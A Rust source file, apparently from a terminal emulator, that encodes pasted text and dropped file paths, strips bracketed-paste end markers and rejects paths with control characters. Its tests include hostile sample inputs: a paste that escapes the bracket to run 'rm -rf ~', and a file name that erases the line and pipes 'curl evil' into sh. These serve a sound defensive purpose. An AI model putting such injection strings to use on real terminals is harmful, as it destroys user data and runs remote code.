//! Pasted text and text that is not a key press.

use super::InputModes;

/// The marker that ends a bracketed paste.
const PASTE_END: &str = "\x1b[201~";

/// Encodes pasted text. Line ends become carriage returns, as if the user typed Enter. With
/// bracketed paste on (mode 2004), the text goes between `ESC [ 200 ~` and `ESC [ 201 ~`, and
/// every end marker in the text is removed first, so that the text cannot end the bracket and
/// send the rest as typed input.
///
/// Other control characters are not changed. The core asks the user before it pastes text with a
/// line end into an agent.
pub fn encode_paste(text: &str, modes: &InputModes, out: &mut Vec<u8>) {
    let bracketed = modes.bracketed_paste();
    if bracketed {
        out.extend_from_slice(b"\x1b[200~");
    }
    let cleaned;
    let text = if bracketed && text.contains("\x1b[") {
        cleaned = without_end_markers(text);
        cleaned.as_str()
    } else {
        text
    };
    let mut rest = text;
    while let Some(at) = rest.find(['\r', '\n']) {
        let (line, after) = rest.split_at(at);
        out.extend_from_slice(line.as_bytes());
        out.push(b'\r');
        rest = after
            .strip_prefix("\r\n")
            .or_else(|| after.strip_prefix(['\r', '\n']))
            .unwrap_or_default();
    }
    out.extend_from_slice(rest.as_bytes());
    if bracketed {
        out.extend_from_slice(PASTE_END.as_bytes());
    }
}

/// The first control character of a path: C0 (`U+0000` to `U+001F`), DEL or C1 (`U+0080` to
/// `U+009F`). A path with one cannot be pasted safely. Single quotes keep the shell from reading
/// it, but a shell without bracketed paste (`/bin/bash` 3.2, `sh`) gets each character as a key:
/// `U+0015` erases the line and a line end runs the rest. `$'…'` would quote them, but `sh` does
/// not know it.
pub fn path_control(path: &str) -> Option<char> {
    path.chars().find(|c| c.is_control())
}

/// Encodes files that the user dropped on a pane: each path in POSIX single quotes and
/// followed by a space, pasted like text. A single quote in a path becomes `'\''`. No path means
/// no bytes. The caller refuses a path with a control character first ([`path_control`]).
pub fn encode_drop_files<S: AsRef<str>>(paths: &[S], modes: &InputModes, out: &mut Vec<u8>) {
    if paths.is_empty() {
        return;
    }
    let mut text = String::new();
    for path in paths {
        text.push('\'');
        for c in path.as_ref().chars() {
            if c == '\'' {
                text.push_str("'\\''");
            } else {
                text.push(c);
            }
        }
        text.push_str("' ");
    }
    encode_paste(&text, modes, out);
}

/// `text` without `ESC [ 201 ~`, also where removing one marker makes another. One pass: after
/// each character, a marker at the end of the output is dropped.
fn without_end_markers(text: &str) -> String {
    let mut kept = String::with_capacity(text.len());
    for c in text.chars() {
        kept.push(c);
        if kept.ends_with(PASTE_END) {
            kept.truncate(kept.len() - PASTE_END.len());
        }
    }
    kept
}

/// Encodes text that is not a key press: the result of an input method or a dead key. It is sent
/// as UTF-8. Text with a line end is bracketed like a paste when the application asked for
/// bracketed paste.
pub fn encode_text(text: &str, modes: &InputModes, out: &mut Vec<u8>) {
    if modes.bracketed_paste() && text.contains(['\r', '\n']) {
        encode_paste(text, modes, out);
    } else {
        out.extend_from_slice(text.as_bytes());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use nh_proto::modes::ModeFlags;

    fn paste(text: &str, flags: ModeFlags) -> Vec<u8> {
        let mut out = Vec::new();
        encode_paste(text, &InputModes::new(flags), &mut out);
        out
    }

    #[test]
    fn line_ends_become_carriage_returns() {
        assert_eq!(paste("a\nb\r\nc\rd", ModeFlags::empty()), b"a\rb\rc\rd");
        assert_eq!(paste("\n\n", ModeFlags::empty()), b"\r\r");
        assert_eq!(paste("日本\n語", ModeFlags::empty()), "日本\r語".as_bytes());
    }

    #[test]
    fn bracketed_paste_wraps_the_text() {
        assert_eq!(
            paste("a\nb", ModeFlags::BRACKETED_PASTE),
            b"\x1b[200~a\rb\x1b[201~"
        );
        assert_eq!(paste("", ModeFlags::BRACKETED_PASTE), b"\x1b[200~\x1b[201~");
    }

    #[test]
    fn the_text_cannot_end_the_bracket() {
        let evil = "a\x1b[201~; rm -rf ~\n";
        assert_eq!(
            paste(evil, ModeFlags::BRACKETED_PASTE),
            b"\x1b[200~a; rm -rf ~\r\x1b[201~"
        );
        // Removing the inner marker must not leave a new one.
        let nested = "\x1b[20\x1b[201~1~x";
        assert_eq!(
            paste(nested, ModeFlags::BRACKETED_PASTE),
            b"\x1b[200~x\x1b[201~"
        );
    }

    #[test]
    fn dropped_files_are_quoted_for_a_posix_shell_and_pasted() {
        let mut out = Vec::new();
        encode_drop_files(
            &["/tmp/a b", "/tmp/it's", "/tmp/$HOME;ls"],
            &InputModes::default(),
            &mut out,
        );
        assert_eq!(out, b"'/tmp/a b' '/tmp/it'\\''s' '/tmp/$HOME;ls' ");
        out.clear();
        encode_drop_files(
            &["/x"],
            &InputModes::new(ModeFlags::BRACKETED_PASTE),
            &mut out,
        );
        assert_eq!(out, b"\x1b[200~'/x' \x1b[201~");
        out.clear();
        encode_drop_files::<&str>(&[], &InputModes::new(ModeFlags::BRACKETED_PASTE), &mut out);
        assert!(out.is_empty(), "no path, no paste");
    }

    #[test]
    fn a_path_with_a_control_character_is_found() {
        // A file of a repository that erases the line and runs a command in `sh`.
        assert_eq!(
            path_control("/repo/\u{15}curl evil|sh;#\n.md"),
            Some('\u{15}')
        );
        for (path, found) in [
            ("/tmp/a\nb", '\n'),
            ("/tmp/a\rb", '\r'),
            ("/tmp/a\u{1b}[201~b", '\u{1b}'),
            ("/tmp/a\u{0}b", '\u{0}'),
            ("/tmp/a\u{7f}b", '\u{7f}'),
            ("/tmp/a\u{9b}b", '\u{9b}'),
        ] {
            assert_eq!(path_control(path), Some(found), "{path:?}");
        }
        for path in [
            "/tmp/a b",
            "/tmp/it's",
            "/tmp/日本 é",
            "/tmp/$HOME;ls",
            "/tmp/\u{a0}x",
        ] {
            assert_eq!(path_control(path), None, "{path:?}");
        }
    }

    #[test]
    fn text_is_utf8_and_brackets_only_with_a_line_end() {
        let mut out = Vec::new();
        let on = InputModes::new(ModeFlags::BRACKETED_PASTE);
        encode_text("é", &on, &mut out);
        assert_eq!(out, "é".as_bytes());
        out.clear();
        encode_text("a\nb", &on, &mut out);
        assert_eq!(out, b"\x1b[200~a\rb\x1b[201~");
        out.clear();
        encode_text("a\nb", &InputModes::default(), &mut out);
        assert_eq!(out, b"a\nb");
    }
}
